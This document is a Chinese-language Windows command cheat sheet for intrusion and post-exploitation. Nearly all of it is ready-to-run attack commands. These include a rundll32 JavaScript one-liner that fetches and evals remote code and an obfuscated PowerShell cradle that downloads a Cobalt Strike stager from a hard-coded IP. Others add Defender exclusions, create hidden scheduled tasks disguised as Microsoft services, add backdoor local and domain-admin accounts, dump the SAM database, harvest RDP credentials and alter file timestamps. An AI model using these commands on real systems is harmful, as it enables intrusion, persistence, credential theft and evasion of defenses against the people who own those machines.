# Windows 命令速查

## TCP 出网探测

```
powershell Test-NetConnection -ComputerName [目标主机名或IP] -Port [端口号]
```

## 远程下载文件

### certutil

```
certutil.exe -urlcache -split -f "http://127.0.0.1:8080/file.exe" "C:/Windows/temp/file.exe"

//从 http://127.0.0.1:8080/ 下载 file.exe 并保存到 C:/Windows/temp/file.exe
```

### PowerShell

```
powershell -Command "Invoke-WebRequest -Uri 'https://www.example.com/file.zip' -OutFile 'C:\Downloads\file.zip'"
```

### BitsAdmin

```
bitsadmin /transfer "JobName" /download /priority normal https://www.example.com/file.zip C:\path\to\save\file.zip
```

### rundll32

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.3.150/chfs/shared/1Z3.exe",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

## IIS 网站查询

> 查看 IIS 绑定的网站：

```
%windir%\system32\inetsrv\appcmd.exe list sites
```

> 查看 Site ID 为 1 的物理路径：

```
%windir%\system32\inetsrv\appcmd list site /site.id:1 /config | findstr "physicalPath"
```

> IIS 配置文件：

```
C:\Windows\System32\inetsrv\config\applicationHost.config
%SystemRoot%\System32\inetsrv\config\applicationHost.config
```

## 查看 Windows 系统版本：

```
wmic os get Caption,osarchitecture
```

## 修改文件时间

```
powershell -command "(Get-Item 'C:\path\to\your\file.txt').CreationTime = '2024-01-01 12:00 AM'; (Get-Item 'C:\path\to\your\file.txt').LastWriteTime = '2024-01-02 12:00 AM'"
```

## 进程操作

> 查看端口对应 PID：
```
netstat -ano | findstr :80
```

> 查看 PID 对应程序：

```
tasklist /FI "PID eq 1234"
```

> 根据 PID 查看程序所在目录：

```
wmic process where ProcessId=1234 get ExecutablePath
```

> 执行进程：

```
start /b  xxx.exe
```

> 根据名称结束进程：
```
taskkill /f /t /im GotoHTTP.exe
```
> 搜索进程
```
tasklist | findstr "powershell"
```

## Powershell 无窗口执行 EXE

```
powershell -executionPolicy bypass Start-Process -WindowStyle hidden -FilePath 'C:/Windows/temp/rd.exe'
```

## net 命令

```
查看用户列表: net user
powershell查看用户列表: Get-WmiObject -Class Win32_UserAccount
查看用户组列表: net localgroup
查看管理组列表: net localgroup Administrators
添加用户并设置密码: net user test P@ssw0rd /add
将用户加入管理组: net localgroup Administrators test /add
将用户加入桌面组: net localgroup "Remote Desktop Users" guest /add
激活guest用户: net user guest /active:yes
更改guest用户的密码: net user guest P@ssw0rd
将用户加入管理组: net localgroup administrators guest /add
将用户加入桌面组: net localgroup "Remote Desktop Users" guest /add
查看本地密码策略: net accounts
查看当前会话: net session
建立IPC会话: net use \\127.0.0.1\c$ "P@ssw0rd" /user:"domain\Administrator"
```

## netsh 操作防火墙

- 查看防火墙配置：

```
netsh firewall show config
```

- Windows Server 2003 及之前的版本，允许指定程序全部连接

```
netsh firewall add allowedprogram C:\nc.exe "allow nc" enable
```

- Windows Server 2003之后的版本

```
netsh advfirewall firewall add rule name="pass nc" dir in action=allow program="C:\nc.exe
```

- 允许3389放行

```
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

## WIndows Defender 加白排除目录：

```
C:\Windows\System32\wbem\wmic.exe /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath=C:\

powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath "C:\test"
```

## 文件写入

```
echo test > C:\test.txt //写入-覆盖
echo test >> c:\test.txt //追加有换行
set /p=test<nul>C:\test.txt //写入
set /p="121d2">>C:\test.txt //不换行追加

//powershell不换行追加
powershell -Command "[System.IO.File]::AppendAllText('C:\windows\temp\111.txt', 'test')"

//规避空格
echo.123>>a.txt
echo,123>>a.txt
type;a.txt

//将base64编码的文件解码写入到 test.jsp
certutil -f -decode base64.txt C:\\test.jsp

//将十六进制文件解码写入到 test.jsp
certutil -decodehex hex.txt C:\\test.jsp
```

## 注册表：

### Restricted Admin Mode

```
对应命令行开启 Restricted Admin mode 命令如下：
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f

查看是否已开启 DisableRestrictedAdmin REG_DWORD 0x0 存在就是开启
REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin"
```

### 查看3389端口

```
REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
```

> https://forum.ywhack.com/coding.php 端口查询

### 开启远程桌面

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f

或者

wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
```

### 导出 SAM 数据库

```
reg save HKLM\SYSTEM sys.hiv
reg save HKLM\SAM sam.hiv

复制：
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SAM

使用 https://github.com/3gstudent/NinjaCopy 进行复制。

lsadump::sam /sam:sam.hiv /system:system.hiv
```

## 查看盘符剩余空间

```
## 大小为字节磁盘
::查看C盘
wmic LogicalDisk where "Caption='C:'" get FreeSpace,Size /value
::查看D盘
wmic LogicalDisk where "Caption='D:'" get FreeSpace,Size /value
```

## 搜索文件：

```
#搜索 D 盘下名为 shell.jsp 的文件
cd /d D:\ && dir /b /s shell.jsp

#搜素 D 盘下后缀为 conf 内容且包含 password（不区分大小写）:
findstr /s /i /n /d:D:\ "password" *.conf
```

## CS 上线

```
powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://122.114.55.117:8012/download/upload.ps1')
```

```
msiexec /q /i http://127.0.0.1:8080/ms10-051.msi
```

## 设置文件属性

```bash
attrib +s +a +h +r cs.exe // 给文件设置系统文件属性、存档文件属性、隐藏文件属性、只读文件属性
```

## 计划任务

```bash
schtasks /create /ru system /tn "Microsoft\Windows\Multimedia\SystemMediaService" /sc ONSTART /tr "C:\cs.exe" 
// 创建一个名为Microsoft\Windows\Multimedia\SystemMediaService，开机时执行 c:\cs.exe 的计 划任务，需要管理员权限

schtasks /change /tn "Microsoft\Windows\Multimedia\SystemSoundsService" /ru system /tr "C:\cs.exe" /enable 
// 修改Microsoft\Windows\Multimedia\SystemSoundsService 计划任务，需要管理员权限， 更改任务无法通过 /sc、/mo 参数更改计划频率
```

## RDP 凭据

```
#列出所有 RDP 凭证
C:\Users\用户名\AppData\Local\Microsoft\Credentials

dir /a C:\Users\Administrator\AppData\Local\Microsoft\Credentials
```

## Windows 打包目录上传文件

```
powershell -Command "Compress-Archive -Path E:\update\ -DestinationPath E:\test.zip"

7z.exe a -r -p12345 C:\webs\1.7z C:\webs\

zip -r C:\webs\1.zip C:\webs\
```

## 域渗透命令

```
whoami /user  //查看当前用户权限
net config workstation  //可知域名和其他信息
net user /domain  //查询域用户
net user edgeuser Admin12345 /add /domain  //添加域用户
net group "domain admins" edgeuser /add /domain  //添加域管理员
net group "enterprise admins" edgeuser /add /domain  //添加企业管理员
net group "domain admins" /domain  //查询域管理员用户
net group "enterprise admins" /domain  //查询域企业管理组
net localgroup administrators /domain  //查询域本地管理组
net time /domain  //查询域控制器和时间
net view /domain  //查询域名称
net view /domain:redteam.local  //查询域内计算机
net group "domain computers" /domain  //查看当前域内计算机列表
net group "domain controllers" /domain  //查看域控机器名
net accounts /domain  //查看域密码策略
nltest /domain_trusts  //查看域信任
nltest /domain_trusts /all_trusts /v /server:10.10.10.10  //查看某个域的域信任
nslookup -type=SRV _ldap._tcp.corp  //通过srv记录查找域控制器
```